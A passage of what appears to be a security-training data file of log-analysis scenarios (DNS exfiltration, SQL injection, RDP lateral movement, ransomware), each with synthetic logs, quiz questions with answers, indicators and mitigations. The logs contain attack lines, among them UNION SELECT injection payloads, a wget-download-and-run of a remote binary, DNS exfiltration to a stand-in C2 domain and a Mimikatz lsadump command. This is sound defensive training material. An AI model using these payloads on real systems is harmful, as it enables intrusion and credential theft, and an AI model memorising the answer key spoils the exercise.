        { phase: 'Collection', detail: 'Dumped entire MySQL database to /tmp/dump.sql using harvested credentials', mitre: ['T1005'] },
        { phase: 'Command & Control', detail: 'Downloaded and executed persistent backdoor connecting to 91.189.91.38:4444', mitre: ['T1071.001'] }
      ],
      mitigation: [
        'Implement file type validation and whitelist allowed extensions',
        'Store uploads outside web root or disable script execution in upload directory',
        'Deploy a Web Application Firewall (WAF) with shell detection rules',
        'Use parameterized database configuration (environment variables, not files)',
        'Restrict outbound network connections from the web server',
        'Run PHP with open_basedir and disable_functions restrictions',
        'Implement Content Security Policy and integrity monitoring on upload directories'
      ],
      frameworks: {
        mitre: [
          { id: 'T1505.003', name: 'Server Software Component: Web Shell', tactic: 'Persistence' },
          { id: 'T1059.004', name: 'Command and Scripting Interpreter: Unix Shell', tactic: 'Execution' },
          { id: 'T1083', name: 'File and Directory Discovery', tactic: 'Discovery' },
          { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' }
        ],
        nist: [
          'PR.AC-4: Access permissions and authorizations are managed with least privilege',
          'PR.DS-5: Protections against data leaks are implemented',
          'PR.IP-1: Baseline configuration of IT systems is established and maintained',
          'DE.CM-7: Monitoring for unauthorized personnel, connections, devices, and software',
          'RS.AN-1: Notifications from detection systems are investigated'
        ],
        owasp: [
          'A01:2021 - Broken Access Control',
          'A03:2021 - Injection',
          'A05:2021 - Security Misconfiguration'
        ],
        cvss: {
          score: 9.8,
          vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
          severity: 'Critical'
        }
      }
    }
  },

  // ===========================================================================
  // SCENARIO 3: DNS Exfiltration
  // ===========================================================================
  'dns-exfil': {
    title: 'DNS Data Exfiltration',
    difficulty: 4,
    logSource: 'dns-query.log',
    mitreTags: 'T1048.001, T1071.004, T1041',
    description: 'A compromised host is exfiltrating sensitive data through DNS queries. The attacker is encoding stolen data as subdomain labels in DNS requests to an attacker-controlled domain. Analyze the DNS query logs to identify the exfiltration channel, determine what data is being stolen, and estimate the volume of exfiltrated information.',

    logs: [
      // Normal DNS traffic baseline
      '14-Jun-2026 10:00:01.123 client 10.0.1.15#49152: query: www.google.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:00:01.456 client 10.0.1.15#49153: query: fonts.googleapis.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:00:02.012 client 10.0.1.22#50001: query: outlook.office365.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:00:02.234 client 10.0.1.22#50002: query: login.microsoftonline.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:00:03.567 client 10.0.1.30#51234: query: github.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:00:04.891 client 10.0.1.15#49154: query: cdn.jsdelivr.net IN A + (10.0.0.1)',
      '14-Jun-2026 10:00:05.123 client 10.0.1.22#50003: query: teams.microsoft.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:00:06.456 client 10.0.1.30#51235: query: api.github.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:00:07.234 client 10.0.1.15#49155: query: www.googleapis.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:00:08.567 client 10.0.1.22#50004: query: smtp.office365.com IN A + (10.0.0.1)',

      // First suspicious queries - encoded subdomain data to evil-c2.xyz
      '14-Jun-2026 10:01:12.001 client 10.0.1.45#55001: query: dXNlcm5hbWU6YWRtaW4.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:01:12.234 client 10.0.1.45#55002: query: cGFzc3dvcmQ6UEBzc3cwcmQx.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:01:12.567 client 10.0.1.45#55003: query: ZGF0YWJhc2U6cHJvZHVjdGlvbg.evil-c2.xyz IN A + (10.0.0.1)',

      // More normal traffic
      '14-Jun-2026 10:01:15.123 client 10.0.1.15#49156: query: www.amazon.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:01:16.456 client 10.0.1.30#51236: query: pypi.org IN A + (10.0.0.1)',
      '14-Jun-2026 10:01:17.789 client 10.0.1.22#50005: query: graph.microsoft.com IN A + (10.0.0.1)',

      // More exfiltration - higher frequency burst
      '14-Jun-2026 10:02:01.001 client 10.0.1.45#55004: query: aG9zdDoxMC4wLjEuMTAw.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:02:01.123 client 10.0.1.45#55005: query: c3NoX2tleT1BQUFBQjNOemFD.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:02:01.234 client 10.0.1.45#55006: query: MXljMkVBQUFBREFRQUJBQUFB.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:02:01.345 client 10.0.1.45#55007: query: R1F1a0Z3OHYxcDNBMXpGTm5l.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:02:01.456 client 10.0.1.45#55008: query: NzQ4QTBFM0FCRUY5OTg3Ng.evil-c2.xyz IN A + (10.0.0.1)',

      // Normal traffic
      '14-Jun-2026 10:02:15.123 client 10.0.1.15#49157: query: mail.google.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:02:16.456 client 10.0.1.22#50006: query: onedrive.live.com IN A + (10.0.0.1)',

      // TXT record queries - unusual and suspicious
      '14-Jun-2026 10:03:01.001 client 10.0.1.45#55009: query: cmd-resp.evil-c2.xyz IN TXT + (10.0.0.1)',
      '14-Jun-2026 10:03:01.234 client 10.0.1.45#55010: query: task-queue.evil-c2.xyz IN TXT + (10.0.0.1)',

      // More exfiltration - credential data
      '14-Jun-2026 10:03:30.001 client 10.0.1.45#55011: query: cm9vdDokNiRyb3VuZHM9NTAwMA.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:03:30.123 client 10.0.1.45#55012: query: MCRhYmNkZWYxMjM0NTY3ODkw.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:03:30.234 client 10.0.1.45#55013: query: JGhhc2hlZHBhc3N3b3JkMTIz.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:03:30.345 client 10.0.1.45#55014: query: YWRtaW46JDYkc2FsdCRoYXNo.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:03:30.456 client 10.0.1.45#55015: query: ZGVwbG95OiQ2JHNhbHQyJGhh.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:03:30.567 client 10.0.1.45#55016: query: c2gxMjM0NTY3ODkwYWJjZGVm.evil-c2.xyz IN A + (10.0.0.1)',

      // Normal traffic
      '14-Jun-2026 10:04:00.123 client 10.0.1.30#51237: query: registry.npmjs.org IN A + (10.0.0.1)',
      '14-Jun-2026 10:04:01.456 client 10.0.1.15#49158: query: accounts.google.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:04:02.789 client 10.0.1.22#50007: query: sharepoint.com IN A + (10.0.0.1)',

      // More exfiltration - environment variables and config
      '14-Jun-2026 10:05:01.001 client 10.0.1.45#55017: query: QVBTX0tFWT0zYTFiMmMzZDRl.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:05:01.123 client 10.0.1.45#55018: query: NWY2YTdiOGM5ZDBlMWYyYTNi.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:05:01.234 client 10.0.1.45#55019: query: NEJMS0VZPXNrX2xpdmVfNTFJ.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:05:01.345 client 10.0.1.45#55020: query: Q3lKQ0RkSGxGZFNEam9TaHhk.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:05:01.456 client 10.0.1.45#55021: query: QVRTX1NFQ1JFVD1teXNlY3Jl.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:05:01.567 client 10.0.1.45#55022: query: dF9hcGlfa2V5XzEyMzQ1Njc4.evil-c2.xyz IN A + (10.0.0.1)',

      // TXT record for receiving commands
      '14-Jun-2026 10:06:00.001 client 10.0.1.45#55023: query: cmd-resp.evil-c2.xyz IN TXT + (10.0.0.1)',

      // Normal traffic
      '14-Jun-2026 10:06:15.123 client 10.0.1.15#49159: query: youtube.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:06:16.456 client 10.0.1.30#51238: query: stackoverflow.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:06:17.789 client 10.0.1.22#50008: query: azure.microsoft.com IN A + (10.0.0.1)',

      // Final burst of exfiltration
      '14-Jun-2026 10:07:01.001 client 10.0.1.45#55024: query: L2V0Yy9ob3N0cz0xMC4wLjEu.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:07:01.123 client 10.0.1.45#55025: query: MTAwIHdlYi1wcm9kLTAxCjEw.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:07:01.234 client 10.0.1.45#55026: query: LjAuMS4xMDEgZGItcHJvZC0w.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:07:01.345 client 10.0.1.45#55027: query: MQoxMC4wLjEuMTAyIGNhY2hl.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:07:01.456 client 10.0.1.45#55028: query: LXByb2QtMDEK.evil-c2.xyz IN A + (10.0.0.1)',
      '14-Jun-2026 10:07:02.001 client 10.0.1.45#55029: query: exfil-complete.evil-c2.xyz IN A + (10.0.0.1)',

      // More TXT queries for C2 commands
      '14-Jun-2026 10:08:00.001 client 10.0.1.45#55030: query: cmd-resp.evil-c2.xyz IN TXT + (10.0.0.1)',
      '14-Jun-2026 10:08:00.234 client 10.0.1.45#55031: query: next-task.evil-c2.xyz IN TXT + (10.0.0.1)',

      // Trailing normal traffic
      '14-Jun-2026 10:08:15.123 client 10.0.1.15#49160: query: www.cloudflare.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:08:16.456 client 10.0.1.22#50009: query: portal.azure.com IN A + (10.0.0.1)',
      '14-Jun-2026 10:08:17.789 client 10.0.1.30#51239: query: docs.github.com IN A + (10.0.0.1)'
    ],

    questions: [
      {
        q: 'What is the domain being used for DNS exfiltration?',
        a: 'evil-c2.xyz',
        hint: 'Look for the second-level domain that receives an abnormal volume of queries with long random subdomains.',
        evidence: 'Dozens of queries with long encoded labels all target *.evil-c2.xyz — the exfiltration/C2 domain.'
      },
      {
        q: 'What encoding method is the attacker using to embed data in DNS queries?',
        a: 'Base64 encoding (the subdomain labels are base64-encoded strings containing stolen data)',
        hint: 'Examine the character set of the long subdomain labels — A-Z, a-z, 0-9 suggests one common scheme.',
        evidence: 'The subdomain labels are base64-encoded chunks of stolen data (alphanumeric, ~20-40 chars each).'
      },
      {
        q: 'What is the IP address of the compromised internal host performing the exfiltration?',
        a: '10.0.1.45',
        hint: 'Find the single internal client issuing the burst of long-label queries to evil-c2.xyz.',
        evidence: 'All exfil queries come from client 10.0.1.45 — the compromised internal host.'
      },
      {
        q: 'Approximately how many DNS queries were used for exfiltration?',
        a: '28 queries to evil-c2.xyz (including data exfil, TXT C2 commands, and completion signal)',
        hint: 'Filter the log to evil-c2.xyz and count the queries from the compromised host.',
        evidence: 'Filtering "evil-c2.xyz" yields ~28 queries (data exfil + TXT C2 + the exfil-complete signal).'
      },
      {
        q: 'What types of data are being exfiltrated based on the decoded subdomains?',
        a: 'Credentials (usernames, passwords, password hashes from /etc/shadow), SSH keys, API keys (Stripe live key visible), database secrets, and /etc/hosts network topology',
        hint: 'Decode a few of the base64 labels to see what categories of secret are leaving.',
        evidence: 'Decoded labels reveal credentials/hashes, SSH keys, API keys, DB secrets, and network topology.'
      },
      {
        q: 'What DNS record types are used for C2 communication versus exfiltration?',
        a: 'A records are used for data exfiltration (encoded data in subdomains), TXT records are used for receiving C2 commands (cmd-resp, task-queue, next-task subdomains)',
        hint: 'Compare the record type (IN A vs IN TXT) on the data-out queries vs the command-polling queries.',
        evidence: 'A-record queries carry encoded data out; TXT queries (cmd-resp, task-queue, next-task) pull C2 commands in.'
      }
    ],

    intel: {
      ioc: [
        'evil-c2.xyz (C2 and exfiltration domain)',
        '10.0.1.45 (compromised internal host)',
        'cmd-resp.evil-c2.xyz (C2 command channel)',
        'task-queue.evil-c2.xyz (C2 task queue)',
        'next-task.evil-c2.xyz (C2 next task polling)',
        'exfil-complete.evil-c2.xyz (exfiltration completion signal)',
        'Base64-encoded subdomain labels exceeding 20 characters'
      ],
      risk: [
        'DNS traffic is typically unmonitored and allowed through firewalls',
        'Exfiltrated data includes credentials, API keys, and network topology',
        'TXT-based C2 channel allows bidirectional command and control',
        'Compromised host has access to sensitive configuration data',
        'No DNS query length or frequency anomaly detection in place',
        'Attacker has established persistent access via the compromised host'
      ],
      attackSteps: [
        { phase: 'Command & Control', detail: 'Established DNS-based C2 channel using TXT records to evil-c2.xyz for receiving commands', mitre: ['T1071.004'] },
        { phase: 'Collection', detail: 'Harvested credentials, SSH keys, API keys, and /etc/hosts from the compromised host', mitre: ['T1005'] },
        { phase: 'Exfiltration', detail: 'Encoded stolen data as base64 subdomain labels in DNS A record queries to evil-c2.xyz', mitre: ['T1048.001'] },
        { phase: 'Exfiltration', detail: 'Sent 25+ DNS queries containing encoded credential data, API keys, and network maps', mitre: ['T1041'] },
        { phase: 'Command & Control', detail: 'Polled for additional tasks via TXT queries to cmd-resp and next-task subdomains', mitre: ['T1071.004'] }
      ],
      mitigation: [
        'Deploy DNS monitoring and anomaly detection for unusual query patterns',
        'Block or sinkhole queries to known-bad domains via threat intelligence feeds',
        'Implement DNS query length thresholds (alert on subdomain labels > 30 chars)',
        'Restrict DNS resolution to approved internal resolvers only',
        'Monitor for high-frequency DNS queries from single internal hosts',
        'Alert on TXT record queries to uncommon or newly registered domains',
        'Deploy DNS-over-HTTPS inspection or force all DNS through monitored resolvers',
        'Investigate and remediate the compromised host (10.0.1.45)'
      ],
      frameworks: {
        mitre: [
          { id: 'T1048.001', name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol', tactic: 'Exfiltration' },
          { id: 'T1071.004', name: 'Application Layer Protocol: DNS', tactic: 'Command and Control' },
          { id: 'T1041', name: 'Exfiltration Over C2 Channel', tactic: 'Exfiltration' }
        ],
        nist: [
          'DE.CM-1: The network is monitored to detect potential cybersecurity events',
          'DE.AE-3: Event data are collected and correlated from multiple sources',
          'PR.DS-5: Protections against data leaks are implemented',
          'PR.PT-4: Communications and control networks are protected',
          'RS.AN-1: Notifications from detection systems are investigated'
        ],
        owasp: [
          'A09:2021 - Security Logging and Monitoring Failures'
        ],
        cvss: {
          score: 7.5,
          vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
          severity: 'High'
        }
      }
    }
  },

  // ===========================================================================
  // SCENARIO 4: SQL Injection -> Data Dump
  // ===========================================================================
  'sqli': {
    title: 'SQL Injection & Data Dump',
    difficulty: 3,
    logSource: 'access.log + app.log',
    mitreTags: 'T1190, T1005, T1213',
    description: 'A web application was probed and then exploited via SQL injection. The attacker enumerated the database schema and dumped sensitive tables. Correlate the web access log with application errors to reconstruct how the injection succeeded and what data was exposed.',

    logs: [
      '198.18.7.42 - - [19/Jun/2026:11:02:11 +0000] "GET /shop/product?id=10 HTTP/1.1" 200 3120 "-" "Mozilla/5.0"',
      '198.18.7.42 - - [19/Jun/2026:11:02:40 +0000] "GET /shop/product?id=11 HTTP/1.1" 200 3044 "-" "Mozilla/5.0"',
      '45.155.205.99 - - [19/Jun/2026:11:14:03 +0000] "GET /shop/product?id=10\' HTTP/1.1" 500 540 "-" "sqlmap/1.8"',
      '45.155.205.99 - - [19/Jun/2026:11:14:03 +0000] "GET /shop/product?id=10\' HTTP/1.1" 500 540 "-" "sqlmap/1.8"',
      'Jun 19 11:14:03 shop-app-01 app[1820]: ERROR pdo: SQLSTATE[42000] syntax error near \'\'\' at line 1 (query id=10\')',
      '45.155.205.99 - - [19/Jun/2026:11:14:21 +0000] "GET /shop/product?id=10+AND+1=1 HTTP/1.1" 200 3120 "-" "sqlmap/1.8"',
      '45.155.205.99 - - [19/Jun/2026:11:14:35 +0000] "GET /shop/product?id=10+AND+1=2 HTTP/1.1" 200 512 "-" "sqlmap/1.8"',
      '45.155.205.99 - - [19/Jun/2026:11:15:02 +0000] "GET /shop/product?id=10+ORDER+BY+5 HTTP/1.1" 200 3120 "-" "sqlmap/1.8"',
      '45.155.205.99 - - [19/Jun/2026:11:15:03 +0000] "GET /shop/product?id=10+ORDER+BY+6 HTTP/1.1" 500 540 "-" "sqlmap/1.8"',
      'Jun 19 11:15:03 shop-app-01 app[1820]: ERROR pdo: SQLSTATE[42S22] Unknown column \'6\' in order clause',
      '45.155.205.99 - - [19/Jun/2026:11:15:40 +0000] "GET /shop/product?id=-1+UNION+SELECT+1,2,3,4,5 HTTP/1.1" 200 3210 "-" "sqlmap/1.8"',
      '45.155.205.99 - - [19/Jun/2026:11:16:12 +0000] "GET /shop/product?id=-1+UNION+SELECT+1,version(),3,4,5 HTTP/1.1" 200 3260 "-" "sqlmap/1.8"',
      '45.155.205.99 - - [19/Jun/2026:11:16:48 +0000] "GET /shop/product?id=-1+UNION+SELECT+1,table_name,3,4,5+FROM+information_schema.tables HTTP/1.1" 200 9120 "-" "sqlmap/1.8"',
      '45.155.205.99 - - [19/Jun/2026:11:17:30 +0000] "GET /shop/product?id=-1+UNION+SELECT+1,column_name,3,4,5+FROM+information_schema.columns+WHERE+table_name=\'users\' HTTP/1.1" 200 7430 "-" "sqlmap/1.8"',
      '45.155.205.99 - - [19/Jun/2026:11:18:15 +0000] "GET /shop/product?id=-1+UNION+SELECT+1,concat(email,0x3a,password_hash),3,4,5+FROM+users HTTP/1.1" 200 84210 "-" "sqlmap/1.8"',
      'Jun 19 11:18:15 shop-app-01 app[1820]: WARN query returned 1843 rows for product lookup (anomalous)',
      '45.155.205.99 - - [19/Jun/2026:11:19:02 +0000] "GET /shop/product?id=-1+UNION+SELECT+1,concat(card_number,0x3a,cvv),3,4,5+FROM+payments HTTP/1.1" 200 152300 "-" "sqlmap/1.8"',
      'Jun 19 11:19:02 shop-app-01 app[1820]: WARN query returned 4920 rows for product lookup (anomalous)',
      '45.155.205.99 - - [19/Jun/2026:11:20:44 +0000] "GET /shop/product?id=10 HTTP/1.1" 200 3120 "-" "sqlmap/1.8"',
      '198.18.7.51 - - [19/Jun/2026:11:34:10 +0000] "GET /shop/product?id=12 HTTP/1.1" 200 3098 "-" "Mozilla/5.0"',
      'Jun 19 11:40:01 shop-app-01 CRON[2110]: pam_unix(cron:session): session opened for user root by (uid=0)',
      'Jun 19 11:40:01 shop-app-01 CRON[2110]: pam_unix(cron:session): session closed for user root'
    ],

    questions: [
      { q: 'What is the IP address of the attacker performing the SQL injection?', a: '45.155.205.99',
        hint: 'Look for the source running an automated tool against the product endpoint with single-quote payloads.',
        evidence: 'All injection requests with the sqlmap/1.8 user-agent and UNION SELECT payloads come from 45.155.205.99.' },
      { q: 'What automated tool did the attacker use (user-agent)?', a: 'sqlmap',
        hint: 'Check the user-agent string on the malicious requests.',
        evidence: 'The user-agent "sqlmap/1.8" identifies the automated SQL injection tool.' },
      { q: 'How many columns does the vulnerable query return (found via ORDER BY)?', a: '5',
        hint: 'The attacker increments ORDER BY until it errors — the last value that worked is the column count.',
        evidence: 'ORDER BY 5 returned 200; ORDER BY 6 errored ("Unknown column 6") — so the query has 5 columns.' },
      { q: 'Which two sensitive tables were dumped?', a: 'users and payments',
        hint: 'Look at the FROM clause of the final UNION SELECT data-extraction requests.',
        evidence: 'UNION SELECT ... FROM users (email/password_hash) and FROM payments (card_number/cvv) were both dumped.' },
      { q: 'What injection technique was used to extract data (keyword)?', a: 'UNION',
        hint: 'The data-extraction payloads all share one SQL keyword that appends attacker-controlled columns.',
        evidence: 'UNION SELECT-based injection was used to append attacker-chosen columns to the product query result.' },
      { q: 'Roughly how many user rows were exposed (from the anomalous row count)?', a: '1843',
        hint: 'The app log warns about an anomalous row count right after the users dump.',
        evidence: 'app log: "query returned 1843 rows" immediately after the users-table UNION dump.' }
    ],

    intel: {
      ioc: ['Requests with single quotes, UNION SELECT, ORDER BY probing', 'sqlmap user-agent', 'information_schema enumeration', 'Anomalous result-set sizes in app logs (1843, 4920 rows)', 'Attacker IP 45.155.205.99'],
      risk: ['Full disclosure of the users and payments tables (PII + cardholder data)', 'Password hashes exposed for offline cracking', 'Likely PCI-DSS / GDPR breach-notification obligations', 'No input validation or parameterized queries on the product endpoint'],
      attackSteps: [
        { phase: 'Reconnaissance', detail: 'Probed id parameter with a single quote, triggering a SQL syntax error', mitre: ['T1190'] },
        { phase: 'Discovery', detail: 'Boolean tests (AND 1=1 / 1=2) confirmed injectability; ORDER BY found 5 columns', mitre: ['T1190'] },
        { phase: 'Collection', detail: 'UNION SELECT enumerated information_schema, then dumped users and payments', mitre: ['T1005', 'T1213'] },
        { phase: 'Exfiltration', detail: 'Sensitive rows returned inline in HTTP responses (84KB, 152KB bodies)', mitre: ['T1005'] }
      ],
      mitigation: ['Use parameterized queries / prepared statements everywhere', 'Apply least-privilege to the DB account (no access to payments from the shop app)', 'Deploy a WAF with SQLi signatures', 'Encrypt/tokenize cardholder data at rest', 'Alert on anomalous result-set sizes and information_schema access'],
      frameworks: {
        mitre: [
          { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' },
          { id: 'T1005', name: 'Data from Local System', tactic: 'Collection' },
          { id: 'T1213', name: 'Data from Information Repositories', tactic: 'Collection' }
        ],
        nist: ['PR.IP-1 Baseline configuration', 'PR.DS-1 Data-at-rest protection', 'DE.CM-1 Network monitoring', 'DE.AE-2 Event analysis'],
        owasp: ['A03:2021 - Injection'],
        cvss: { score: 9.1, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', severity: 'Critical' }
      }
    }
  },

  // ===========================================================================
  // SCENARIO 5: Lateral Movement via RDP
  // ===========================================================================
  'lateral-rdp': {
    title: 'Lateral Movement via RDP',
    difficulty: 3,
    logSource: 'Windows Security Event Log',
    mitreTags: 'T1021.001, T1078, T1550',
    description: 'After compromising a workstation, an attacker used valid credentials to move laterally across the Windows estate over RDP. Analyze the Security event log (logon events 4624/4625/4648) to trace which host was patient zero and how far the attacker spread.',

    logs: [
      '2026-06-18T01:55:10 win-ws-014 Security-Auditing[4624]: Successful logon. Account=jdoe LogonType=2 (Interactive) Source=127.0.0.1',
      '2026-06-18T02:10:44 win-ws-014 Security-Auditing[4648]: Logon with explicit credentials. Account=jdoe Target=svc_backup Process=C:\\\\Windows\\\\System32\\\\runas.exe',
      '2026-06-18T02:12:01 win-ws-014 Security-Auditing[4625]: Failed logon. Account=administrator LogonType=3 (Network) Source=10.0.5.14',
      '2026-06-18T02:12:03 win-ws-022 Security-Auditing[4625]: Failed logon. Account=administrator LogonType=10 (RemoteInteractive) Source=10.0.5.14',
      '2026-06-18T02:12:09 win-ws-022 Security-Auditing[4625]: Failed logon. Account=administrator LogonType=10 (RemoteInteractive) Source=10.0.5.14',
      '2026-06-18T02:12:30 win-ws-022 Security-Auditing[4624]: Successful logon. Account=svc_backup LogonType=10 (RemoteInteractive) Source=10.0.5.14',
      '2026-06-18T02:14:55 win-ws-022 Security-Auditing[4648]: Logon with explicit credentials. Account=svc_backup Target=administrator Process=mstsc.exe',
      '2026-06-18T02:16:20 win-fs-003 Security-Auditing[4624]: Successful logon. Account=svc_backup LogonType=10 (RemoteInteractive) Source=10.0.5.22',
      '2026-06-18T02:18:42 win-fs-003 Security-Auditing[4672]: Special privileges assigned to new logon. Account=svc_backup Privileges=SeDebugPrivilege,SeBackupPrivilege',
      '2026-06-18T02:21:09 win-fs-003 Security-Auditing[4624]: Successful logon. Account=administrator LogonType=10 (RemoteInteractive) Source=10.0.5.22',
      '2026-06-18T02:25:33 win-dc-001 Security-Auditing[4624]: Successful logon. Account=administrator LogonType=3 (Network) Source=10.0.5.30',
      '2026-06-18T02:26:01 win-dc-001 Security-Auditing[4672]: Special privileges assigned to new logon. Account=administrator Privileges=SeDebugPrivilege,SeTcbPrivilege',
      '2026-06-18T02:28:47 win-dc-001 Security-Auditing[4688]: New process. Account=administrator Process=C:\\\\Windows\\\\Temp\\\\m.exe CommandLine="m.exe lsadump::sam"',
      '2026-06-18T02:30:12 win-dc-001 Security-Auditing[4624]: Successful logon. Account=krbtgt LogonType=3 (Network) Source=10.0.5.30',
      '2026-06-18T03:05:00 win-ws-014 Security-Auditing[4634]: Account logoff. Account=jdoe',
      '2026-06-18T08:30:11 win-ws-031 Security-Auditing[4624]: Successful logon. Account=asmith LogonType=2 (Interactive) Source=127.0.0.1'
    ],

    questions: [
      { q: 'Which workstation was the attacker\'s starting point (patient zero)?', a: 'win-ws-014',
        hint: 'Find the first interactive (LogonType 2) logon, then the runas that creates the service account session.',
        evidence: 'win-ws-014 has the initial interactive jdoe logon and the 4648 runas to svc_backup that begins the spread.' },
      { q: 'Which service account did the attacker abuse for lateral movement?', a: 'svc_backup',
        hint: 'Look for the account that keeps appearing in RemoteInteractive (LogonType 10) logons across hosts.',
        evidence: 'svc_backup is used for RDP (LogonType 10) onto win-ws-022 and win-fs-003 — the lateral-movement account.' },
      { q: 'What logon type indicates the RDP (remote desktop) sessions?', a: '10',
        hint: 'RDP shows up as a specific LogonType in Windows Security events.',
        evidence: 'LogonType 10 (RemoteInteractive) marks the RDP sessions used to hop between hosts.' },
      { q: 'What is the hostname of the domain controller that was ultimately compromised?', a: 'win-dc-001',
        hint: 'Follow the chain to the host where SeTcbPrivilege and an lsadump occur.',
        evidence: 'win-dc-001 receives the administrator logon, SeTcbPrivilege, and the m.exe lsadump::sam process.' },
      { q: 'What credential-theft tool/command was run on the DC?', a: 'lsadump (mimikatz m.exe)',
        hint: 'Check the 4688 new-process event and its command line on the DC.',
        evidence: '4688: Process=C:\\\\Windows\\\\Temp\\\\m.exe CommandLine="m.exe lsadump::sam" — a Mimikatz-style credential dump.' },
      { q: 'Which sensitive account logon right after the dump suggests a Golden Ticket risk?', a: 'krbtgt',
        hint: 'A network logon for one very specific account on the DC is a major red flag.',
        evidence: 'A network logon for krbtgt on the DC immediately after lsadump indicates potential Golden Ticket abuse.' }
    ],

    intel: {
      ioc: ['Burst of 4625 failures followed by 4624 success from one source IP', 'svc_backup used for RemoteInteractive (RDP) logons', 'SeDebugPrivilege / SeTcbPrivilege assignments', 'm.exe in C:\\\\Windows\\\\Temp running lsadump', 'krbtgt network logon'],
      risk: ['Domain Controller compromise → full domain takeover', 'Credential material (SAM, krbtgt hash) exposed', 'Golden Ticket persistence possible', 'Service account over-privileged and reused across hosts'],
      attackSteps: [
        { phase: 'Initial Access', detail: 'Interactive logon on win-ws-014, then runas to the svc_backup service account', mitre: ['T1078'] },
        { phase: 'Lateral Movement', detail: 'RDP (LogonType 10) with svc_backup onto win-ws-022 then win-fs-003', mitre: ['T1021.001'] },
        { phase: 'Privilege Escalation', detail: 'SeDebug/SeTcb privileges acquired on the file server and DC', mitre: ['T1078', 'T1550'] },
        { phase: 'Credential Access', detail: 'lsadump on the DC harvested SAM and krbtgt material', mitre: ['T1003'] }
      ],
      mitigation: ['Restrict RDP with network segmentation and a jump host', 'Remove interactive/RDP rights from service accounts; use gMSA', 'Enable Credential Guard and LSASS protection', 'Tier-0 isolation for DCs; just-in-time admin', 'Alert on 4648 explicit-credential and SeTcbPrivilege events'],
      frameworks: {
        mitre: [
          { id: 'T1021.001', name: 'Remote Services: RDP', tactic: 'Lateral Movement' },
          { id: 'T1078', name: 'Valid Accounts', tactic: 'Defense Evasion, Persistence' },
          { id: 'T1550', name: 'Use Alternate Authentication Material', tactic: 'Lateral Movement' },
          { id: 'T1003', name: 'OS Credential Dumping', tactic: 'Credential Access' }
        ],
        nist: ['PR.AC-4 Access permissions', 'PR.AC-7 Authentication commensurate with risk', 'DE.CM-3 Personnel activity monitoring', 'DE.AE-2 Event analysis'],
        owasp: ['A07:2021 - Identification and Authentication Failures'],
        cvss: { score: 9.0, vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H', severity: 'Critical' }
      }
    }
  },

  // ===========================================================================
  // SCENARIO 6: Ransomware Indicator
  // ===========================================================================
  'ransomware': {
    title: 'Ransomware Detonation',
    difficulty: 4,
    logSource: 'syslog + kern.log',
    mitreTags: 'T1486, T1490, T1489',
    description: 'A file server began behaving erratically: shadow copies vanished, a backup service stopped, and thousands of files were rewritten in minutes. Analyze the system logs to confirm a ransomware detonation, find the kill-chain markers, and scope the damage.',

    logs: [
      'Jun 17 22:01:14 fs-prod-07 systemd[1]: Started Daily apt upgrade and clean activities.',
      'Jun 17 22:14:50 fs-prod-07 sshd[5521]: Accepted password for fileadmin from 10.0.9.40 port 49210 ssh2',
      'Jun 17 22:16:32 fs-prod-07 sudo:  fileadmin : TTY=pts/0 ; PWD=/home/fileadmin ; USER=root ; COMMAND=/usr/bin/wget http://193.43.55.12/update.bin -O /tmp/update.bin',
      'Jun 17 22:16:48 fs-prod-07 sudo:  fileadmin : TTY=pts/0 ; PWD=/home/fileadmin ; USER=root ; COMMAND=/bin/chmod +x /tmp/update.bin',
      'Jun 17 22:17:05 fs-prod-07 sudo:  fileadmin : TTY=pts/0 ; PWD=/home/fileadmin ; USER=root ; COMMAND=/tmp/update.bin',
      'Jun 17 22:17:06 fs-prod-07 kernel: update.bin[6012]: segfault avoided; child process spawned pid=6013',
      'Jun 17 22:17:10 fs-prod-07 update.bin[6013]: deleting volume shadow copies',
      'Jun 17 22:17:11 fs-prod-07 systemd[1]: Stopping LVM2 snapshot service...',
      'Jun 17 22:17:12 fs-prod-07 systemd[1]: backup.service: Deactivated successfully.',
